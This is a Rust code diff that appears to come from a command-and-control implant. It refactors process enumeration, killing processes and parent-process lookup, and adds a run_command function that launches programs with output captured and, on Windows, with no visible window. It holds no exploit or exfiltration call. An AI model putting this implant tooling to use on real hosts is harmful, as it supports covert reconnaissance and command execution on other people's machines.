@@ -1,7 +1,7 @@
-use crate::protobuf::implantpb;
-use crate::CommonError;
+use crate::{to_error, CommonError};
 use std::collections::HashMap;
 use std::process;
+use std::process::{Command, Stdio};
 use sysinfo::{ProcessRefreshKind, RefreshKind, System};
 
 #[cfg(target_family = "unix")]
@@ -10,7 +10,7 @@ pub fn kill(pid: u32) -> Result<(), CommonError> {
     if res.eq(&0) {
         Ok(())
     } else {
-        Err(CommonError::UnixError(std::io::Error::last_os_error()))
+        Err(CommonError::IOError(std::io::Error::last_os_error()))
     }
 }
 
@@ -20,9 +20,9 @@ pub fn kill(pid: u32) -> Result<(), CommonError> {
     use windows::Win32::System::Threading::{OpenProcess, TerminateProcess, PROCESS_TERMINATE};
 
     unsafe {
-        let process_handle: HANDLE = OpenProcess(PROCESS_TERMINATE, false, pid)?;
-        TerminateProcess(process_handle, 1)?;
-        CloseHandle(process_handle)?;
+        let process_handle: HANDLE = to_error!(OpenProcess(PROCESS_TERMINATE, false, pid))?;
+        to_error!(TerminateProcess(process_handle, 1))?;
+        to_error!(CloseHandle(process_handle))?;
     }
 
     Ok(())
@@ -33,7 +33,7 @@ pub fn get_current_process_name() -> String {
     #[cfg(target_os = "linux")]
     {
         use std::fs::File;
-        use std::io::{self, Read};
+        use std::io::Read;
 
         let mut file = match File::open("/proc/self/comm") {
             Ok(file) => file,
@@ -102,7 +102,7 @@ pub fn get_parent_pid() -> Result<u32, CommonError> {
         CreateToolhelp32Snapshot, Process32First, Process32Next, PROCESSENTRY32, TH32CS_SNAPPROCESS,
     };
 
-    let snapshot = unsafe { CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0) }?;
+    let snapshot = unsafe { to_error!(CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)) }?;
     let mut process_entry = PROCESSENTRY32::default();
     process_entry.dwSize = std::mem::size_of::<PROCESSENTRY32>() as u32;
 
@@ -120,14 +120,16 @@ pub fn get_parent_pid() -> Result<u32, CommonError> {
         }
     }
 
-    Err(CommonError::WinApiError(windows::core::Error::from_win32()))
+    Err(CommonError::AnyError(anyhow::anyhow!("Parent process not found")))
 }
 
-#[derive(Clone, Debug)]
+#[cfg_attr(debug_assertions, derive(Debug))]
+#[derive(Clone, Default)]
 pub struct Process {
     pub name: String,
     pub pid: u32,
     pub ppid: u32,
+    pub uid: String,
     pub arch: String,
     pub owner: String,
     pub path: String,
@@ -136,11 +138,31 @@ pub struct Process {
 
 pub fn get_process(pid: u32) -> Result<Process, CommonError> {
     let mut processes = get_processes()?;
-    Ok(processes.remove(&pid).expect("process not found"))
+    Ok(processes.remove(&pid).unwrap_or_default())
 }
 
-pub fn get_current_process() -> Result<Process, CommonError> {
-    get_process(get_current_pid())
+pub fn get_process_owner(pid: u32) -> String {
+    #[cfg(target_family = "windows")]
+    {
+        crate::win::process::get_process_owner(pid).unwrap_or_default()
+    }
+
+    #[cfg(not(target_family = "windows"))]
+    {
+        "".to_string()
+    }
+}
+
+pub fn get_process_arch(pid: u32) -> String{
+    #[cfg(target_family = "windows")]
+    {
+        crate::win::process::get_process_architecture(pid).unwrap_or_default()
+    }
+
+    #[cfg(not(target_family = "windows"))]
+    {
+        "".to_string()
+    }
 }
 
 pub fn get_processes() -> Result<HashMap<u32, Process>, CommonError> {
@@ -149,8 +171,8 @@ pub fn get_processes() -> Result<HashMap<u32, Process>, CommonError> {
     for (pid, process) in System::new_with_specifics(
         RefreshKind::new().with_processes(ProcessRefreshKind::everything()),
     )
-    .processes()
-    .into_iter()
+        .processes()
+        .into_iter()
     {
         processes.insert(
             pid.as_u32(),
@@ -158,11 +180,10 @@ pub fn get_processes() -> Result<HashMap<u32, Process>, CommonError> {
                 name: process.name().to_string_lossy().to_string(),
                 pid: pid.as_u32(),
                 ppid: process.parent().map_or_else(|| 0, |p| p.as_u32()),
-                arch: "".to_string(),
-                owner: "".to_string(),
-                path: process
-                    .exe()
-                    .map_or_else(|| "".to_string(), |p| p.to_string_lossy().into_owned()),
+                arch: get_process_arch(pid.as_u32()),
+                uid: process.user_id().map_or_else(||"".to_string(), |uid| uid.to_string()),
+                owner: get_process_owner(pid.as_u32()),
+                path: process.exe().map_or_else(|| "".to_string(), |p| p.to_string_lossy().into_owned()),
                 args: process
                     .cmd()
                     .iter()
@@ -175,7 +196,7 @@ pub fn get_processes() -> Result<HashMap<u32, Process>, CommonError> {
     Ok(processes)
 }
 
-pub fn default_arch() -> String {
+pub fn get_arch() -> String {
     if cfg!(target_arch = "x86_64") {
         "x86_64".to_string()
     } else if cfg!(target_arch = "x86") {
@@ -189,16 +210,45 @@ pub fn default_arch() -> String {
     }
 }
 
-pub fn default_process() -> Option<implantpb::Process> {
-    crate::common::process::get_current_process()
+pub fn get_current_process() -> Option<Process> {
+    get_process(get_current_pid())
         .ok()
-        .map(|process| implantpb::Process {
+        .map(|process| Process {
             pid: process.pid,
             ppid: process.ppid,
+            uid: process.uid,
             name: process.name,
             path: process.path,
             args: process.args,
             owner: process.owner,
-            arch: default_arch(),
+            arch: process.arch,
         })
+}
+
+
+pub fn run_command(path: String, args: Vec<String>, _output: bool) -> std::result::Result<std::process::Child, std::io::Error> {
+    // let (stdout, stderr) = if output {
+    //     (Stdio::piped(), Stdio::piped())
+    // } else {
+    //     (Stdio::null(), Stdio::null())
+    // };
+
+    #[cfg(target_os = "windows")]
+    {
+        use std::os::windows::process::CommandExt;
+        Command::new(path)
+            .creation_flags(0x08000000)
+            .args(args)
+            .stdout(Stdio::piped())
+            .stderr(Stdio::piped())
+            .spawn()
+    }
+    #[cfg(target_family = "unix")]
+    {
+        Command::new(path)
+            .args(args)
+            .stdout(Stdio::piped())
+            .stderr(Stdio::piped())
+            .spawn()
+    }
 }
